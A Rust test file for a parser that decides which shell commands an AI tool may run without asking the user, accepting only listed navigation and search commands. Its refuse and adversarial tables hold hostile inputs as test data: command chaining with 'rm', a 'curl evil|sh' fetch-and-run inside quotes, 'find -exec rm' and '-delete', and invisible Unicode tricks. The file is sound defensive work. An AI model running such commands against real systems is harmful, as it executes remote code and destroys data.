use super::*;
use crate::core::ai::tools::command::validate;
use crate::core::ai::tools::paths::Want;

fn runs(text: &str) -> bool {
    parse(text).is_ok()
}

fn why(text: &str) -> &'static str {
    parse(text).expect_err(text).why
}

// Spec (pane-execution, command grammar): the table rows that run.
#[test]
fn the_accept_table_runs() {
    for text in [
        "cd ~/dev/curso-rust",
        "cd",
        "cd ~",
        "cd ..",
        "pwd",
        "ls",
        "ls -la src",
        "ls -1thr a b",
        "ls a b c d",
        "tree",
        "tree -d -L 2 src",
        "tree -L 2 -d",
        "rg -n a/b",
        "rg a",
        "rg 'my dir'",
        "cd música",
        "ls año-2026",
        "cd ~/dev/curso-ñandú",
        "cd 'música nueva'",
        "cd a.b_c@d%e+f:g,h=i",
        "tree -L '2'",
        "cd áéíóúüñçàèò",
        "cd øåæłőžĀɏ",
        "cd \"/home/u/curso rust\"",
        "ls -la \"Mis Documentos\"",
        "ls \"año 2026\"",
        "tree -L \"2\"",
    ] {
        assert!(runs(text), "{text:?} must run");
    }
}

#[test]
fn the_refuse_table_goes_to_the_prompt() {
    for text in [
        "cd mu\u{202e}sica",
        "cd a\u{200b}b",
        "cd a\u{200d}b",
        "cd a\u{200c}b",
        "ls\u{feff}",
        "cd a\u{00a0}b",
        "cd\u{1b}[31m",
        "ls\u{85}",
        "ls\u{7f}",
        "ls a\u{2028}b",
        "ls a\u{2029}b",
        "ls 'a\\b'",
        "ls 'it''s'",
        "cd '~/x'",
        "cd '-x'",
        "cd ''",
        "cd +x",
        "cd %1",
        "cd =ls",
        "cd a; rm b",
        "ls | wc",
        "ls > f",
        "ls < f",
        "cd $(pwd)",
        "ls $HOME",
        "ls *",
        "ls a?",
        "ls [a]",
        "cd \"$HOME\"",
        "cd \"`id`\"",
        "cd \"a\\\"b\"",
        "cd \"!x\"",
        "cd \"a\"b",
        "cd a\"b\"",
        "cd \"~/x\"",
        "cd \"-x\"",
        "cd \"\"",
        "cd \"unterminated",
        "cd \"a'b\"",
        "cd \"a\tb\"",
        "\"ls\"",
        "ls \"a\" \"b",
        "ls a`b`",
        "ls a&",
        "ls a!",
        "ls a#",
        "ls {a}",
        "ls a\\b",
        "FOO=1 ls",
        "ls\npwd",
        "ls a\r",
        "ls a\tb",
        " ls",
        "ls ",
        "ls  a",
        "cd ~root",
        "cd -",
        "cd --",
        "",
        "'ls'",
        "rm x",
        "ls 'unterminated",
        "ls 'a'b",
        "ls a'b'",
    ] {
        assert!(!runs(text), "{text:?} must go to the prompt");
    }
}

// Spec: a decomposed accent is refused, a precomposed one is accepted.
#[test]
fn nfd_combining_marks_are_refused_and_nfc_is_accepted() {
    assert!(runs("cd m\u{00fa}sica"));
    assert!(!runs("cd mu\u{0301}sica"));
    assert!(!runs("cd 'mu\u{0301}sica'"));
    assert!(!runs("cd a\u{3001}b"));
}

#[test]
fn every_flag_table_row() {
    for text in [
        "ls -la",
        "ls -1t -r src",
        "tree -L 12",
        "tree -d",
        "ls -a a b c d",
        "pwd",
    ] {
        assert!(runs(text), "{text:?} must run");
    }
    for text in [
        "ls -R",
        "ls -lR",
        "ls --all",
        "ls -- -x",
        "ls -",
        "tree -a",
        "tree -aL 2",
        "tree -d -a",
        "tree -a -L 2 src",
        "tree -o out.txt",
        "tree -L",
        "tree -L x",
        "tree -L 123",
        "tree -L -a",
        "tree -dL 2",
        "tree a b",
        "mkdir -m 777 x",
        "mkdir",
        "mkdir -p",
        "mkdir a b c d e",
        "ls a b c d e",
        "cd a b",
        "cd -P x",
        "pwd x",
        "pwd -P",
    ] {
        assert!(!runs(text), "{text:?} must go to the prompt");
    }
}

#[test]
fn the_word_and_byte_limits() {
    assert!(runs("ls a b c d"));
    assert!(!runs("ls a b c d e f g h"));
    assert!(!runs("tree -d -d -d -d -d -d -d -d"));
    let long = format!("cd {}", "a".repeat(MAX_COMMAND_BYTES));
    assert_eq!(why(&long), "command too long");
    let edge = format!("cd {}", "a".repeat(MAX_COMMAND_BYTES - 3));
    assert!(runs(&edge));
}

// Spec: the offending token's byte span and a reason, for the S5 prompt.
#[test]
fn the_fallback_names_the_token_and_the_reason() {
    let f = parse("ls -R src").unwrap_err();
    assert_eq!(&"ls -R src"[f.at.clone()], "-R");
    assert_eq!(f.why, "flag not allowed");

    let f = parse("cd a; rm b").unwrap_err();
    assert_eq!(&"cd a; rm b"[f.at.clone()], "a;");
    assert_eq!(f.why, "shell metacharacter");

    let f = parse("cd a  b").unwrap_err();
    assert_eq!(f.at, 5..6);
    assert_eq!(f.why, "extra space");

    let f = parse("ls ").unwrap_err();
    assert_eq!(f.at, 2..3);
    assert_eq!(f.why, "trailing space");

    let f = parse("rm x").unwrap_err();
    assert_eq!(&"rm x"[f.at.clone()], "rm");
    assert_eq!(f.why, "not a safe command");

    let text = "cd mu\u{202e}sica";
    let f = parse(text).unwrap_err();
    assert_eq!(&text[f.at.clone()], "mu\u{202e}sica");
    assert_eq!(f.why, "invisible or non-ASCII space character");

    assert_eq!(why("FOO=1 ls"), "environment assignment");
    assert_eq!(why("cd ~root"), "~user is not supported");
    assert_eq!(why("ls a\tb"), "control character");
    assert_eq!(why("ls a\"b\""), "double quote");
    assert_eq!(why("cd \"a\"b"), "text after a quote");
    assert_eq!(why("cd \"$HOME\""), "shell metacharacter");
    assert_eq!(why("\"ls\" a"), "the command is quoted");
    assert_eq!(why("ls a b c d e f g h i"), "too many words");
    assert_eq!(why(""), "empty command");
    assert_eq!(why("mkdir"), "not a safe command");
    assert_eq!(why("grep foo"), "missing argument");
    // L32: git is no safe command; its words fall back as at the baseline.
    assert_eq!(why("git status"), "not a safe command");
    assert_eq!(why("git log HEAD~1"), "~ only starts a word");
    assert_eq!(why("ls a~b"), "~ only starts a word");
    assert_eq!(why("ls a^b"), "character not allowed");
}

fn targets(text: &str) -> Vec<(&str, Want)> {
    (parse(text).unwrap().targets())
        .map(|t| (t.input, t.want))
        .collect()
}

/// The targets with what the check does with them: judged against the
/// chat's root (`confined`) and walked for the files a search reads
/// (`searched`).
fn roles(text: &str) -> Vec<(&str, Want, bool, bool)> {
    (parse(text).unwrap().targets())
        .map(|t| (t.input, t.want, t.confined, t.searched))
        .collect()
}

#[test]
fn targets_per_verb() {
    use Want::{Existing, Home};
    assert_eq!(targets("cd"), [("~", Existing)]);
    assert_eq!(targets("cd ~/x"), [("~/x", Existing)]);
    assert_eq!(targets("cd 'a b'"), [("a b", Existing)]);
    assert_eq!(targets("cd \"a b\""), [("a b", Existing)]);
    assert_eq!(
        targets("ls -la \"Mis Documentos\" src"),
        [
            (".", Existing),
            ("Mis Documentos", Existing),
            ("src", Existing)
        ]
    );
    assert_eq!(targets("pwd"), [(".", Existing)]);
    assert_eq!(targets("ls"), [(".", Existing)]);
    assert_eq!(
        targets("ls -la a /srv"),
        [(".", Existing), ("a", Existing), ("/srv", Existing)]
    );
    assert_eq!(targets("tree"), [(".", Home)]);
    assert_eq!(targets("tree -d -L 2 src"), [(".", Home), ("src", Home)]);
    assert_eq!(targets("tree /etc"), [(".", Home), ("/etc", Home)]);
}

// S1, L22: what a command acts on is judged against the chat's root: the
// path arguments, or the pane's directory when it names none. A search
// reads the files below what it searches; its pattern is no path.
#[test]
fn targets_say_what_the_root_and_the_search_walk_judge() {
    use Want::{Existing, Home};
    assert_eq!(roles("cd"), [("~", Existing, true, false)]);
    assert_eq!(roles("cd src"), [("src", Existing, true, false)]);
    // `pwd` reads no file and goes nowhere: it runs wherever the pane is.
    assert_eq!(roles("pwd"), [(".", Existing, false, false)]);
    assert_eq!(roles("ls"), [(".", Existing, true, false)]);
    assert_eq!(
        roles("ls -la src"),
        [
            (".", Existing, false, false),
            ("src", Existing, true, false)
        ]
    );
    assert_eq!(roles("tree"), [(".", Home, true, false)]);
    assert_eq!(
        roles("tree src"),
        [(".", Home, false, false), ("src", Home, true, false)]
    );
    assert_eq!(roles("rg foo"), [(".", Home, true, true)]);
    assert_eq!(
        roles("rg -n -A 2 'fn main' src lib"),
        [
            (".", Existing, false, false),
            ("src", Home, true, true),
            ("lib", Home, true, true)
        ]
    );
    assert_eq!(
        roles("grep -n foo a.rs"),
        [(".", Existing, false, false), ("a.rs", Home, true, false)]
    );
    assert_eq!(
        roles("grep -rn foo src"),
        [(".", Existing, false, false), ("src", Home, true, true)]
    );
    assert_eq!(roles("find"), [(".", Existing, true, false)]);
    assert_eq!(
        roles("find src -name Cargo.toml -type f -maxdepth 2"),
        [
            (".", Existing, false, false),
            ("src", Existing, true, false)
        ]
    );
}

// S1: search and navigation run without a prompt in `run` (the paths are
// judged later): grep, rg and find, with an allow-list
// of flags.
#[test]
fn search_commands_parse_as_safe() {
    for text in [
        "rg foo",
        "rg -n -i 'fn main' src",
        "rg -A 2 -C 3 foo",
        "rg -B 1 -m 10 foo src",
        "rg -t rust --max-depth 2 foo src",
        "rg --line-number --ignore-case --fixed-strings --no-heading foo",
        "rg -lc foo",
        "grep foo Cargo.toml",
        "grep -rn foo src",
        "grep -inwvFEHhsox -A 2 foo a b",
        "find",
        "find . -name Cargo.toml -type f",
        "find src -maxdepth 2 -mindepth 1 -type d",
        "find . -iname 'read me'",
    ] {
        assert!(runs(text), "{text:?} must run");
    }
}

// S1, S3, L20: a search must never become a write or an execution, and
// every other command asks. `mkdir` asks like any write.
#[test]
fn writes_executions_and_other_commands_never_parse_as_safe() {
    for (text, reason) in [
        ("mkdir x", "not a safe command"),
        ("mkdir -p a/b", "not a safe command"),
        ("cargo build", "not a safe command"),
        ("npm test", "not a safe command"),
        ("sh x.sh", "not a safe command"),
        ("find . -exec rm", "flag not allowed"),
        ("find . -execdir x", "flag not allowed"),
        ("find . -delete", "flag not allowed"),
        ("find . -ok rm", "flag not allowed"),
        ("find . -okdir rm", "flag not allowed"),
        ("find . -fprint out", "flag not allowed"),
        ("find . -fprintf out x", "flag not allowed"),
        ("find . -fls out", "flag not allowed"),
        ("find -L .", "flag not allowed"),
        ("find . -type x", "-type needs f, d or l"),
        ("find . -name", "the flag needs a value"),
        ("find . -name -delete", "the flag needs a value"),
        ("rg --pre cat foo", "flag not allowed"),
        ("rg --pre=cat foo", "flag not allowed"),
        ("rg --pre-glob x foo", "flag not allowed"),
        ("rg -z foo", "flag not allowed"),
        ("rg --search-zip foo", "flag not allowed"),
        ("rg -L foo", "flag not allowed"),
        ("rg --follow foo", "flag not allowed"),
        ("rg -u foo", "flag not allowed"),
        ("rg --hidden foo", "flag not allowed"),
        ("rg --no-ignore foo", "flag not allowed"),
        ("rg -f list", "flag not allowed"),
        ("rg -t --pre=cat foo", "the flag needs a value"),
        ("rg -A x foo", "the flag needs a number"),
        ("rg -A 1234 foo", "the flag needs a number"),
        ("rg", "missing argument"),
        ("grep foo", "missing argument"),
        ("grep -r foo", "missing argument"),
        ("grep -R foo .", "flag not allowed"),
        ("grep -f list x", "flag not allowed"),
        ("grep --include=x foo .", "flag not allowed"),
        ("git", "not a safe command"),
        ("git status", "not a safe command"),
        ("git log --oneline", "not a safe command"),
        ("git diff", "not a safe command"),
        ("git push", "not a safe command"),
    ] {
        assert_eq!(why(text), reason, "{text:?}");
    }
}

// Spec: checked bytes == written bytes; the API borrows, it never owns.
#[test]
fn as_str_borrows_the_input() {
    let text = String::from("ls -la \"a b\"");
    let cmd = parse(&text).unwrap();
    assert_eq!(cmd.as_str().as_ptr(), text.as_ptr());
    assert_eq!(cmd.as_str(), text);
    assert_eq!(cmd.verb(), Verb::Ls);
}

/// A tiny deterministic generator, so no property-test crate is needed.
struct Lcg(u64);

impl Lcg {
    fn next(&mut self) -> usize {
        self.0 = self
            .0
            .wrapping_mul(6364136223846793005)
            .wrapping_add(1442695040888963407);
        (self.0 >> 33) as usize
    }
}

// Spec (design D20): the grammar is a strict subset of `validate`, and the
// accepted text is returned untouched.
#[test]
fn accepted_text_is_a_fixed_point_of_validate() {
    const PIECES: &[&str] = &[
        "cd", "ls", "tree", "pwd", "rg", " ", " ", " ", "-", "-la", "-p", "-L", "2", "~", "/", "a",
        "b", "dir", ".", "..", "'", "'x y'", "música", "ñ", "日本", ";", "|", "$", "*", "\n", "\t",
        "\u{202e}", "\u{200b}", "\u{00a0}", "\u{0301}", "\u{3164}", "\u{115f}", "=", "+", "%", "^",
        "\"", "`", "\\", "'a", "\"x y\"", "\"a", "!", "#", "~/x", "a~", "\r", "\0", "'", "?", "[",
        "&", "(", "-L 2", "--", "a=~", "a:~", "\u{5b0}", "\u{2460}", "א",
    ];
    let mut rng = Lcg(7);
    let mut accepted = 0;
    for _ in 0..200_000 {
        let mut text = String::new();
        for _ in 0..1 + rng.next() % 8 {
            text.push_str(PIECES[rng.next() % PIECES.len()]);
        }
        if let Ok(cmd) = parse(&text) {
            accepted += 1;
            assert_eq!(cmd.as_str(), text);
            assert_eq!(validate(&text).unwrap().as_str(), text, "{text:?}");
        }
    }
    assert!(accepted > 1000, "the generator must reach accepted input");
}

// Every scalar value in one position: nothing `validate` would rewrite or
// refuse may pass (the Hangul fillers are letters but draw as blanks).
#[test]
fn no_single_character_slips_past_validate() {
    let mut buf = [0u8; 4];
    for c in ('\0'..=char::MAX).filter(|c| !c.is_ascii() || c.is_ascii_control()) {
        let c = &*c.encode_utf8(&mut buf);
        for text in [
            format!("ls a{c}b"),
            format!("ls 'a{c}b'"),
            format!("ls \"a{c}b\""),
            format!("ls {c}"),
        ] {
            if parse(&text).is_ok() {
                assert_eq!(validate(&text).unwrap().as_str(), text, "{text:?}");
            }
        }
    }
    assert!(!runs("ls a\u{3164}b"));
    assert!(!runs("ls a\u{115f}b"));
}

#[test]
fn every_ascii_byte_is_classified_like_the_spec() {
    for b in 0u8..128 {
        let c = char::from(b);
        let word = c.is_ascii_alphanumeric() || ".-_/@%+:,=".contains(c);
        assert_eq!(runs(&format!("ls a{c}")), word, "unquoted {c:?}");
        // Inside quotes: the unquoted class plus the space, nothing a shell
        // could expand or end a quote, `$(` or a heredoc with.
        let quoted = word || c == '~' || c == ' ';
        assert_eq!(runs(&format!("ls 'a{c}'")), quoted, "quoted {c:?}");
        assert_eq!(runs(&format!("ls \"a{c}\"")), quoted, "dquoted {c:?}");
    }
}

// Only Latin letters (U+00C0..=U+024F, minus the multiplication and division
// signs) are allowed beyond ASCII; every other script, mark and symbol is not.
#[test]
fn non_ascii_is_limited_to_latin_letters() {
    for c in ['\u{c0}', 'ñ', 'ø', 'ł', '\u{100}', '\u{24f}', 'ß', 'ÿ'] {
        assert!(runs(&format!("cd a{c}b")), "{c:?} must run");
        assert!(runs(&format!("cd 'a {c}'")), "{c:?} must run quoted");
        assert!(runs(&format!("cd \"a {c}\"")), "{c:?} must run dquoted");
    }
    for c in [
        '\u{5b0}',
        '\u{345}',
        '\u{93e}',
        '\u{2160}',
        '\u{2460}',
        '\u{b2}',
        'א',
        'ا',
        '日',
        'α',
        'ж',
        '\u{d7}',
        '\u{f7}',
        '\u{bf}',
        '\u{250}',
        '\u{3164}',
        '\u{115f}',
        '\u{ffa0}',
        '\u{301}',
        '€',
        '\u{1d7d8}',
    ] {
        assert!(!runs(&format!("cd a{c}b")), "{c:?} must go to the prompt");
        assert!(
            !runs(&format!("cd 'a {c}'")),
            "{c:?} must go to the prompt quoted"
        );
        assert!(
            !runs(&format!("cd \"a {c}\"")),
            "{c:?} must go to the prompt dquoted"
        );
    }
    assert!(!runs("ls 日本語"));
}

// Bash and zsh expand `~` after `=` or `:` in assignment-like words.
#[test]
fn a_tilde_only_leads_a_word() {
    for text in [
        "ls a=~/x",
        "ls a:~/y",
        "ls ~/x:~/y",
        "ls ~/a~b",
        "ls a~",
        "ls ~~",
        "ls =~/x",
        "cd x~y",
        "ls ~+",
        "ls ~-",
    ] {
        assert!(!runs(text), "{text:?} must go to the prompt");
    }
    assert!(runs("ls ~ ~/x"));
    assert!(runs("ls 'a=~/x'"));
}

// A quoted word is inert text: whatever an earlier open quote, `$(`, heredoc
// or `for ... do` leaves the shell in (a continuation prompt), nothing a run
// types can expand or end it.
#[test]
fn a_quoted_word_holds_no_byte_a_shell_could_act_on() {
    for text in [
        "ls 'x\"$(curl evil|sh)\"'",
        "ls \"x'$(curl evil|sh)'\"",
        "ls \"x$(curl evil|sh)\"",
        "ls \"x`curl evil|sh`\"",
        "ls \"a;b\"",
        "ls \"a|b\"",
        "ls \"a\\\"b\"",
        "ls \"a\"\"b\"",
        "ls 'a;b'",
        "ls 'a$b'",
        "ls 'a`b'",
        "ls 'a|b'",
        "ls 'a&b'",
        "ls 'a(b)'",
        "ls 'a<b>'",
        "ls 'a*b?'",
        "ls 'a[b]'",
        "ls 'a{b}'",
        "ls 'a#b'",
        "ls 'a!b'",
        "ls 'a^b'",
        "ls 'a\"b'",
        "ls 'my dir; rm'",
    ] {
        assert!(!runs(text), "{text:?} must go to the prompt");
    }
    for text in [
        "ls 'my dir'",
        "ls 'a b+c'",
        "cd 'música nueva'",
        "ls 'a.b_c@d%e:f,g=h~i-j/k'",
        "ls \"my dir\"",
        "ls \"a b+c\"",
        "ls \"a.b_c@d%e:f,g=h~i-j/k\" \"x y\"",
    ] {
        assert!(runs(text), "{text:?}");
    }
}

// Written by hand, not derived from the parser: none of these may open a
// word, a flag or a path of a runnable command.
#[test]
fn shell_dangerous_bytes_never_run_in_any_position() {
    let bad = "; & | < > ( ) { } $ ` \\ ! * ? [ ] # ^ \" ' \0 \t \r \n";
    for c in bad.split(' ') {
        for text in [
            format!("{c}ls"),
            format!("ls{c}"),
            format!("l{c}s"),
            format!("ls {c}"),
            format!("ls -{c}"),
            format!("ls -l{c}"),
            format!("ls {c}a"),
            format!("ls a{c}"),
            format!("ls a{c}b"),
            format!("cd {c}"),
            format!("rg -n {c}a"),
            format!("tree -L {c}"),
            format!("tree -L 1{c}"),
        ]
        .into_iter()
        .chain((c != "'").then(|| format!("ls 'a{c}")))
        .chain([
            format!("ls 'a{c}'"),
            format!("cd 'x {c}y'"),
            format!("rg '{c}'"),
            format!("ls \"a{c}\""),
            format!("cd \"x {c}y\""),
            format!("rg \"{c}\""),
        ])
        .chain((c != "\"").then(|| format!("ls \"a{c}")))
        {
            assert!(!runs(&text), "{text:?} must go to the prompt");
        }
    }
    for text in [" ls", "ls ", "ls a ", "ls  a", "ls\u{0}", "\tls", "ls\n"] {
        assert!(!runs(text), "{text:?}");
    }
}

/// Real shells split a runnable command into exactly the words the grammar
/// found. Opt in with `cargo test -- --ignored`. The script is passed to the
/// shell directly (never through a user shell) and only `printf` runs.
#[test]
#[ignore = "needs bash; zsh is checked when present"]
fn real_shells_split_accepted_commands_like_the_grammar() {
    use std::process::Command;
    const HOME: &str = "/home/x";
    const TABLE: &[&str] = &[
        "cd ~/dev/curso-rust",
        "cd ~",
        "ls -la src",
        "ls -1thr a b",
        "tree -d -L 2 src",
        "tree -L '2'",
        "rg -n a/b",
        "rg 'my dir'",
        "rg 'a b+c'",
        "cd música",
        "ls año-2026",
        "cd ~/dev/curso-ñandú",
        "ls a.b_c@d%e+f:g,h=i",
        "ls ~ ~/x",
        "cd \"/home/u/curso rust\"",
        "ls -la \"Mis Documentos\"",
        "rg \"año 2026\"",
        "ls \"a b\" 'c d' e",
    ];
    let mut shells = vec!["bash"];
    if Command::new("zsh").arg("-c").arg(":").output().is_ok() {
        shells.push("zsh");
    }
    for shell in shells {
        for text in TABLE {
            let cmd = parse(text).expect(text);
            let args = text.split_once(' ').unwrap().1;
            let out = Command::new(shell)
                .arg("-c")
                .arg(format!("printf '%s\\n' {args}"))
                .env_clear()
                .env("HOME", HOME)
                .output()
                .unwrap();
            let got = String::from_utf8(out.stdout).unwrap();
            let want: Vec<String> = cmd.words[1..cmd.len]
                .iter()
                .map(|w| match w.strip_prefix('~') {
                    Some(rest) => format!("{HOME}{rest}"),
                    None => w.to_string(),
                })
                .collect();
            assert_eq!(got.lines().collect::<Vec<_>>(), want, "{shell}: {text}");
        }
    }
}

// The reason is the condition that fired, not the shape of the token.
#[test]
fn a_quoted_ninth_word_is_too_many_words_and_a_quoted_verb_is_quoted() {
    assert_eq!(why("ls a b c d e f g \"h\""), "too many words");
    assert_eq!(why("ls a b c d e f g 'h i'"), "too many words");
    assert_eq!(why("ls a b c d e f g h"), "too many words");
    assert_eq!(why("\"ls\" a"), "the command is quoted");
}

// The token an error names covers the whole quoted word.
#[test]
fn the_token_of_a_quoted_word_runs_to_its_closing_quote() {
    let token = |text: &str| {
        let at = parse(text).unwrap_err().at;
        text[at].to_owned()
    };
    assert_eq!(token("\"ls\" a"), "\"ls\"");
    assert_eq!(
        token("ls a b c d e f g \"Mis Documentos\""),
        "\"Mis Documentos\""
    );
    assert_eq!(token("ls \"Mis $Documentos\" x"), "\"Mis $Documentos\"");
    assert_eq!(token("ls 'a b!' x"), "'a b!'");
    assert_eq!(token("ls \"open word"), "\"open word");
    assert_eq!(token("ls a$b c"), "a$b");
    // Non-ASCII starts and interiors cut on character boundaries.
    assert_eq!(token("ls é$ x"), "é$");
    assert_eq!(token("ls \"é$\" x"), "\"é$\"");
    assert_eq!(token("ls \"é ñ"), "\"é ñ");
    assert_eq!(token("ls 'aé'x y"), "'aé'x");
    // Text after the closing quote belongs to the token.
    assert_eq!(token("ls \"a\"b c"), "\"a\"b");
    assert_eq!(token("ls \"a\"b"), "\"a\"b");
}

// The verifier's adversarial list: none of these may run on its own.
#[test]
fn grammar_refuses_the_adversarial_list() {
    let long = format!("ls {}", "a".repeat(5000));
    for text in [
        "find . -exec rm {} ;",
        "find . -exec rm",
        "find . -delete",
        "find . -fprint out",
        "find . -newer x",
        "find -L .",
        "rg --pre cat foo",
        "rg -z foo",
        "rg -L foo",
        "rg -uu foo",
        "rg --hidden foo",
        "rg -e foo",
        "rg -A1 foo",
        "rg --max-depth=1 foo",
        "rg '-x'",
        "rg -- -x",
        "grep -R foo .",
        "grep -f list .",
        "grep -e foo .",
        "git status",
        "git log --oneline",
        "git diff",
        "git -C x status",
        "git --git-dir=x status",
        "git -c a=b status",
        "git -p log",
        "git --paginate log",
        "git log --output=x",
        "git log --ext-diff",
        "git log --show-signature",
        "git log --format=x",
        "git diff --no-index a b",
        "cd -",
        "cd ~root",
        "ls \u{ff0d}la",
        "ls \u{fe63}la",
        "ls a\u{200b}b",
        "rg \u{ff0d}\u{ff0d}pre foo",
        long.as_str(),
    ] {
        assert!(parse(text).is_err(), "{text:?} must go to the prompt");
    }
}
